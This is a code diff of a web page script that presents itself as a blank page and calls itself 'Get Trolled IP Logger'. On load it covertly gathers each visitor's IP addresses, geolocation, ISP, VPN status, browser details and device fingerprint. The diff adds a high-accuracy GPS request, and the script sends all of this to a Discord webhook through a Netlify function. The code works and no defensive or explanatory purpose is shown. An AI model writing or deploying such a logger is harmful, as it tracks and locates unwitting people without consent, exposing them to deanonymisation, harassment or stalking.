@@ -1,92 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title></title>
-  <style>
-    html, body {
-      margin: 0; padding: 0; height: 100%;
-      background: black;
-      user-select: none;
-      overflow: hidden;
-    }
-    #error-message {
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      color: red;
-      background: black;
-      padding: 10px;
-      font-family: monospace;
-      white-space: pre-wrap;
-      cursor: pointer;
-      display: none;
-      z-index: 9999;
-      max-height: 50vh;
-      overflow-y: auto;
-    }
-  </style>
-</head>
-<body>
-  <div id="error-message" title="Click to copy error message"></div>
-
 <script>
-  const netlifyFunctionUrl = "/.netlify/functions/log-ip";
-
-  function safeGet(obj, path, defaultValue = '') {
-    return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
-  }
-
-  function safeValue(val, maxLen=1024) {
-    if (val === undefined || val === null || val === '') return "N/A";
-    val = val.toString();
-    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
-    return val;
-  }
-
-  function safeName(name) {
-    if (!name) return "N/A";
-    return name.length > 256 ? name.slice(0, 253) + "..." : name;
-  }
-
-  function parseUserAgent(ua) {
-    let os = "Unknown OS";
-    let browser = "Unknown Browser";
-
-    if (/Android/.test(ua)) {
-      os = "Android";
-    } else if (/iPhone/.test(ua)) {
-      os = "iOS (iPhone)";
-    } else if (/iPad/.test(ua)) {
-      os = "iOS (iPad)";
-    } else if (/Windows NT/.test(ua)) {
-      os = "Windows";
-    } else if (/Mac OS X/.test(ua)) {
-      os = "Mac OS";
-    }
-
-    if (/Chrome\/\d+/.test(ua)) {
-      browser = "Chrome";
-    } else if (/Firefox\/\d+/.test(ua)) {
-      browser = "Firefox";
-    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
-      browser = "Safari";
-    } else if (/Edg\/\d+/.test(ua)) {
-      browser = "Edge";
-    }
-
-    return { os, browser };
-  }
-
-  function chunkArray(arr, size) {
-    const result = [];
-    for(let i = 0; i < arr.length; i += size) {
-      result.push(arr.slice(i, i + size));
-    }
-    return result;
-  }
-
-  // Hash + fingerprint
+  // Simple hash function
   function hashString(str) {
     let hash = 0;
     for (let i = 0; i < str.length; i++) {
@@ -123,16 +36,38 @@
       const res = await fetch('https://api64.ipify.org?format=json');
       if (!res.ok) return "N/A";
       const json = await res.json();
-      if (json.ip && json.ip.includes(':')) {
-        return json.ip;
-      }
+      if (json.ip && json.ip.includes(':')) return json.ip;
       return "N/A";
     } catch {
       return "N/A";
     }
   }
 
+  function parseUserAgent(ua) {
+    let os = "Unknown OS";
+    let browser = "Unknown Browser";
+    if (/Android/.test(ua)) os = "Android";
+    else if (/iPhone/.test(ua)) os = "iOS (iPhone)";
+    else if (/iPad/.test(ua)) os = "iOS (iPad)";
+    else if (/Windows NT/.test(ua)) os = "Windows";
+    else if (/Mac OS X/.test(ua)) os = "Mac OS";
+    if (/Chrome\/\d+/.test(ua)) browser = "Chrome";
+    else if (/Firefox\/\d+/.test(ua)) browser = "Firefox";
+    else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Edg\/\d+/.test(ua)) browser = "Edge";
+    return { os, browser };
+  }
+
+  function chunkArray(arr, size) {
+    const result = [];
+    for (let i = 0; i < arr.length; i += size) {
+      result.push(arr.slice(i, i + size));
+    }
+    return result;
+  }
+
   async function sendDiscordWebhook(embeds) {
+    const netlifyFunctionUrl = "/.netlify/functions/log-ip";
     const res = await fetch(netlifyFunctionUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -144,75 +79,69 @@
     }
   }
 
+  async function getGPSLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve({ lat: "N/A", lon: "N/A" });
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+        () => resolve({ lat: "N/A", lon: "N/A" }),
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    });
+  }
+
   (async () => {
-    const errorDiv = document.getElementById('error-message');
+    const data = await fetchIPInfo();
+    const ipv6 = await fetchIPv6();
+    const uaInfo = parseUserAgent(navigator.userAgent);
+    const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
+    const gps = await getGPSLocation();
 
-    try {
-      const data = await fetchIPInfo();
-      const ipv6 = await fetchIPv6();
-      const uaInfo = parseUserAgent(navigator.userAgent);
-      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
+    const allFields = [
+      { name: "Device Fingerprint", value: `\`${getDeviceFingerprint()}\``, inline: false },
+      { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
+      { name: "IPv6 Address", value: ipv6, inline: true },
+      { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
+      { name: "Latitude (GeoIP)", value: data.latitude, inline: true },
+      { name: "Longitude (GeoIP)", value: data.longitude, inline: true },
+      { name: "Latitude (GPS)", value: gps.lat, inline: true },
+      { name: "Longitude (GPS)", value: gps.lon, inline: true },
+      { name: "ISP", value: data.isp, inline: false },
+      { name: "Organization", value: data.org, inline: false },
+      { name: "ASN", value: data.asn, inline: true },
+      { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
+      { name: "Local Time", value: localTime, inline: true },
+      { name: "VPN/Proxy", value: data.security?.is_proxy ? "Yes" : "No", inline: true },
+      { name: "VPN/Hosting", value: data.security?.is_hosting ? "Yes" : "No", inline: true },
+      { name: "Bot", value: data.security?.is_bot ? "Yes" : "No", inline: true },
+      { name: "Operating System", value: uaInfo.os, inline: true },
+      { name: "Browser", value: uaInfo.browser, inline: true },
+      { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+      { name: "Screen Resolution", value: `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)`, inline: true },
+    ];
 
-      const allFields = [
-        { name: "Device Fingerprint", value: `\`${getDeviceFingerprint()}\``, inline: false },
-        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
-        { name: "IPv6 Address", value: ipv6, inline: true },
-        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
-        { name: "Latitude", value: safeValue(data.latitude), inline: true },
-        { name: "Longitude", value: safeValue(data.longitude), inline: true },
-        { name: "ISP", value: safeValue(data.isp), inline: false },
-        { name: "Organization", value: safeValue(data.org), inline: false },
-        { name: "ASN", value: safeValue(data.asn), inline: true },
-        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
-        { name: "Local Time", value: safeValue(localTime), inline: true },
-        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
-        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
-        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
-        { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
-        { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
-        { name: "Full User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
-        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} @${safeValue(window.devicePixelRatio)} DPR\``, inline: true },
-        { name: "Color Depth", value: `${safeValue(window.screen.colorDepth)}-bit`, inline: true },
-        { name: "Viewport Size", value: `${safeValue(window.innerWidth)}×${safeValue(window.innerHeight)}`, inline: true }
-      ];
+    const chunks = chunkArray(allFields, 25);
+    const embeds = chunks.map((fieldsChunk, i) => ({
+      title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
+      color: 0x00ffff,
+      timestamp: new Date().toISOString(),
+      footer: i === chunks.length - 1 ? {
+        text: "Get Trolled IP Logger",
+        icon_url: "https://i.imgur.com/qZ7j0fV.png"
+      } : undefined,
+      thumbnail: i === 0 ? { url: data.country_flag } : undefined,
+      author: i === 0 ? {
+        name: "Get Trolled IP Logger",
+        url: "https://discord.com",
+        icon_url: "https://i.imgur.com/qZ7j0fV.png"
+      } : undefined,
+      fields: fieldsChunk.map(f => ({
+        name: f.name,
+        value: f.value.toString(),
+        inline: !!f.inline
+      }))
+    }));
 
-      const chunks = chunkArray(allFields, 25);
-
-      const embeds = chunks.map((fieldsChunk, i) => ({
-        title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
-        color: 0x00ffff,
-        timestamp: new Date().toISOString(),
-        footer: i === chunks.length - 1 ? {
-          text: "Get Trolled IP Logger",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        } : undefined,
-        thumbnail: i === 0 ? {
-          url: safeValue(data.country_flag, 200)
-        } : undefined,
-        author: i === 0 ? {
-          name: "Get Trolled IP Logger",
-          url: "https://discord.com",
-          icon_url: "https://i.imgur.com/qZ7j0fV.png"
-        } : undefined,
-        fields: fieldsChunk.map(f => ({
-          name: safeName(f.name),
-          value: safeValue(f.value),
-          inline: !!f.inline
-        }))
-      }));
-
-      await sendDiscordWebhook(embeds);
-
-    } catch (err) {
-      errorDiv.style.display = "block";
-      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
-      errorDiv.onclick = () => {
-        navigator.clipboard.writeText(err.message)
-          .then(() => alert("Error message copied! Send it to me."))
-          .catch(() => alert("Failed to copy error message."));
-      };
-    }
+    await sendDiscordWebhook(embeds);
   })();
 </script>
-</body>
-</html>
